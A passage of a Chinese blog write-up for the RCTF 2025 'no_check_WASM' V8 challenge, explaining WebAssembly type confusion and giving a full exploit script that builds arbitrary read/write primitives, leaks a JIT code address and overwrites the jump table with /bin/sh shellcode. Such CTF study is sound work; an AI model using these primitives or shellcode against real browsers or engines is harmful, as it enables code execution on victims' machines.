v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DoReturn&lt;(v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::StackElementsCountMode)1, (v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::MergeType)2&gt; (this=0x7ffcd15f3cb0)</span><br><span class="line">    at ../../src/wasm/function-body-decoder-impl.h:7943</span><br><span class="line">#11 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeEndImpl (this=0x7ffcd15f3cb0, trace_msg=&lt;optimized out&gt;, opcode=&lt;optimized out&gt;)</span><br><span class="line">    at ../../src/wasm/function-body-decoder-impl.h:4036</span><br><span class="line">#12 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeEnd (decoder=0x7ffcd15f3cb0, opcode=&lt;optimized out&gt;) at ../../src/wasm/function-body-decoder-impl.h:3943</span><br><span class="line">#13 0x000055bfc2553b7b in v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::DecodeFunctionBody (this=0x7ffcd15f3cb0) at ../../src/wasm/function-body-decoder-impl.h:3287</span><br><span class="line">#14 v8::internal::wasm::WasmFullDecoder&lt;v8::internal::wasm::Decoder::NoValidationTag, v8::internal::wasm::(anonymous namespace)::LiftoffCompiler, (v8::internal::wasm::DecodingMode)0&gt;::Decode (this=this@entry=0x7ffcd15f3cb0) at ../../src/wasm/function-body-decoder-impl.h:3110</span><br><span class="line">#15 0x000055bfc255244c in v8::internal::wasm::ExecuteLiftoffCompilation (env=env@entry=0x7ffcd15f4538, func_body=..., compiler_options=...)</span><br><span class="line">    at ../../src/wasm/baseline/liftoff-compiler.cc:10823</span><br><span class="line">#16 0x000055bfc25db9fb in v8::internal::wasm::WasmCompilationUnit::ExecuteCompilation (this=0x7ffcd15f45b0, env=0x7ffcd15f4538,</span><br><span class="line">    wire_bytes_storage=0x1b6c00024918, counter_updates=0x1b6c000145c0, detected=0x7ffcd15f45a8) at ../../src/wasm/function-compiler.cc:110</span><br><span class="line">#17 0x000055bfc25df4f8 in v8::internal::wasm::CompileLazy (isolate=isolate@entry=0x1b6c00188000, native_module=native_module@entry=0x1b6c00014400,</span><br><span class="line">    func_index=func_index@entry=0) at ../../src/wasm/module-compiler.cc:1165</span><br><span class="line">#18 0x000055bfc253207a in v8::internal::__RT_impl_Runtime_WasmCompileLazy (args=..., isolate=0x1b6c00188000) at ../../src/runtime/runtime-wasm.cc:401</span><br><span class="line">#19 v8::internal::Runtime_WasmCompileLazy (args_length=&lt;optimized out&gt;, args_object=&lt;optimized out&gt;, isolate=0x1b6c00188000)</span><br><span class="line">    at ../../src/runtime/runtime-wasm.cc:387</span><br><span class="line">#20 0x000055bfc31aa849 in Builtins_WasmCEntry ()</span><br><span class="line">#21 0x000055bfc31a2d95 in Builtins_WasmCompileLazy ()</span><br><span class="line">#22 0x0000000000000000 in ?? ()</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在具体利用之前我们先来熟悉一下WASM的几个数据类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i32 int32类型</span><br><span class="line">i64 int64类型</span><br><span class="line">externref 外部引用 用于wasm和javascript的对象交互，但是wasm并不能知道javascript对象具体结构布局</span><br><span class="line">struct 内部结构体 wasm完全知道结构布局</span><br></pre></td></tr></table></figure><p>然后我们开始构造<code>addressOf</code>和<code>fakeObj</code>原语，我们可以通过函数返回时的控制流合并进行类型混淆</p><h5 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;addressOf&quot;, makeSig([kWasmExternRef], [kWasmI32])) //接受一个externref类型返回一个int32类型</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,//将第一个参数压入栈中，返回值默认从栈顶开始取</span><br><span class="line">]);               </span><br></pre></td></tr></table></figure><h5 id="fakeObj"><a href="#fakeObj" class="headerlink" title="fakeObj"></a>fakeObj</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;fakeObj&quot;, makeSig([kWasmI32], [kWasmExternRef]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">    kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h5 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR &amp;&amp; AAW"></a>AAR &amp;&amp; AAW</h5><p>这里注意一下AAR和AAW的时候要先把i64通过控制流合并进行类型混淆成struct</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const structType = builder.addStruct([makeField(kWasmI64, true)]);</span><br><span class="line"> </span><br><span class="line">const i2s = builder.addFunction(&quot;i64_to_struct&quot;,makeSig([kWasmI64], [wasmRefType(structType)]))</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;AAR&quot;, makeSig([kWasmI64], [kWasmI64]))</span><br><span class="line">.exportFunc() </span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,             //获取第一个参数</span><br><span class="line">  kExprCallFunction, i2s.index, //将第一个参数传入i2s函数</span><br><span class="line">  kGCPrefix, kExprStructGet,    //解引用读取</span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),//指定从哪种结构体读取</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),//0表示读取第一个字段</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;AAW&quot;, makeSig([kWasmI64, kWasmI64], []))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">  kExprCallFunction, i2s.index,</span><br><span class="line">  kExprLocalGet, 1, //获取第二个参数即要写入的数据</span><br><span class="line">  kGCPrefix, kExprStructSet, //解引用写入</span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h5 id="泄露沙箱的基址-wasm-stack"><a href="#泄露沙箱的基址-wasm-stack" class="headerlink" title="泄露沙箱的基址&amp;wasm stack"></a>泄露沙箱的基址&amp;wasm stack</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;leak_cage_base&quot;, makeSig([kWasmExternRef], [kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">builder.addFunction(&quot;leak_stack&quot;, makeSig([], [kWasmI64, kWasmI64, kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprI64Const, 0,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h5 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h5><p>实际调试发现泄露出的值与栈偏移处的值并不相等，我的猜测是struct的结构体并不是直接指向第一个字段的应该还有其他结构然后才是字段？所以有偏移。后面看了flyyyy师傅的解释<code>这里泄漏出来的值与栈偏移处的值并不相等，原因应该是当i64被cast成struct的时候，底层的heaptype等字段被修改，因此实际转换成struct进行取值的时候，会略微有偏差（通过以前阅读src/wasm/*的推测，这次并没有通过源码验证）</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let stack_addr = leak_stack();</span><br><span class="line">for(let i = 0; i &lt; stack_addr.length; i++)&#123;</span><br><span class="line">  hexx(&quot;stack_addr[&quot;+i+&quot;]&quot;, stack_addr[i]);</span><br><span class="line">&#125;</span><br><span class="line">stack_value = stack_addr[0] &lt;&lt; 32n | stack_addr[1];</span><br><span class="line">hexx(&quot;stack_value&quot;, stack_value);</span><br><span class="line"> </span><br><span class="line"> for(let i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">   let test = AAR(stack_value+1n+BigInt(i*0x8));</span><br><span class="line">   hexx(&quot;test&quot;, test);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211041049303.png" alt="image-20251211041049303"></p><p>然后可以看到泄露出的第一个地址位于jit-code所在的段，调试发现于jump_table的偏移也是固定的(在笔者的机器上是0x2940)的那么我们可以将jump_table本来要跳转的汇编指令部分修改为我们的shellcode(将我们的shellcode覆盖在蓝框的区域问题都不大)</p><p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051515193.png" alt="image-20251211051515193"></p><p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211051730977.png" alt="image-20251211051730977"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line">path = &quot;../v8/test/mjsunit/wasm/wasm-module-builder.js&quot;;</span><br><span class="line">d8.file.execute(path);</span><br><span class="line"></span><br><span class="line">const builder = new WasmModuleBuilder();</span><br><span class="line"></span><br><span class="line">const structType = builder.addStruct([makeField(kWasmI64, true)]);</span><br><span class="line"> </span><br><span class="line">const i2s = builder.addFunction(&quot;i64_to_struct&quot;,makeSig([kWasmI64], [wasmRefType(structType)]))</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;AAR&quot;, makeSig([kWasmI64], [kWasmI64]))</span><br><span class="line">.exportFunc() </span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,                              </span><br><span class="line">  kExprCallFunction, i2s.index, </span><br><span class="line">  kGCPrefix, kExprStructGet,    </span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;AAW&quot;, makeSig([kWasmI64, kWasmI64], []))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprLocalGet, 0,</span><br><span class="line">  kExprCallFunction, i2s.index,</span><br><span class="line">  kExprLocalGet, 1, </span><br><span class="line">  kGCPrefix, kExprStructSet, </span><br><span class="line">  ...wasmUnsignedLeb(structType, kMaxVarInt32Size),</span><br><span class="line">  ...wasmUnsignedLeb(0, kMaxVarInt32Size),</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">builder.addFunction(&quot;leak_stack&quot;, makeSig([], [kWasmI64, kWasmI64, kWasmI64]))</span><br><span class="line">.exportFunc()</span><br><span class="line">.addBody([</span><br><span class="line">  kExprI64Const, 0,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">const instance = builder.instantiate();</span><br><span class="line">let &#123;leak_stack, AAR, AAW&#125; = instance.exports;</span><br><span class="line"></span><br><span class="line">let stack_addr = leak_stack();</span><br><span class="line">for(let i = 0; i &lt; stack_addr.length; i++)&#123;</span><br><span class="line">  hexx(&quot;stack_addr[&quot;+i+&quot;]&quot;, stack_addr[i]);</span><br><span class="line">&#125;</span><br><span class="line">stack_value = stack_addr[0] &lt;&lt; 32n | stack_addr[1];</span><br><span class="line">hexx(&quot;stack_value&quot;, stack_value);</span><br><span class="line"> </span><br><span class="line">//stop()</span><br><span class="line"></span><br><span class="line">let jit_code_addr = AAR(stack_value+1n);</span><br><span class="line"> </span><br><span class="line">hexx(&quot;jit_code_addr&quot;, jit_code_addr);</span><br><span class="line"> </span><br><span class="line">let wasm_code = new Uint8Array([</span><br><span class="line">  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0,</span><br><span class="line">  1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128,</span><br><span class="line">  128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105,</span><br><span class="line">  110, 0, 0, 10, 142, 128, 128, 128, 0, 1, 136, 128, 128, 128, 0, 0, 65, 239, 253, 182, 245, 125,</span><br><span class="line">  11,</span><br><span class="line">])</span><br><span class="line">let wasm_module  = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance  = new WebAssembly.Instance(wasm_module);</span><br><span class="line">let shell = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let offset = 0x2940n;</span><br><span class="line">let rop_addr = jit_code_addr+offset;</span><br><span class="line"></span><br><span class="line">hexx(&quot;rop_addr&quot;, rop_addr);</span><br><span class="line"> </span><br><span class="line">let shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell();//start_jump_table有点类似glibc的lazy binding，第一次shell()是用于初始化的</span><br><span class="line">//stop()</span><br><span class="line">for(let i = 0; i &lt; shellcode.length; i++)&#123;</span><br><span class="line">  AAW(rop_addr+BigInt(i*0x8)+1n, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shell();</span><br></pre></td></tr></table></figure><p><img src="/2025/12/10/RCTF2025-no_check_WASM/index/image-20251211054125360.png" alt="image-20251211054125360">参考:<a href="https://flyyy.top/2025/11/17/rctf-2025-no_check_WASM/">RCTF 2025 - no_check_WASM - flyyy’s blog</a></p>]]></content>
      
      
      <categories>
          
          <category> V8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8 Pwn的学习</title>
      <link href="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"/>
      <url>/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/</url>
      
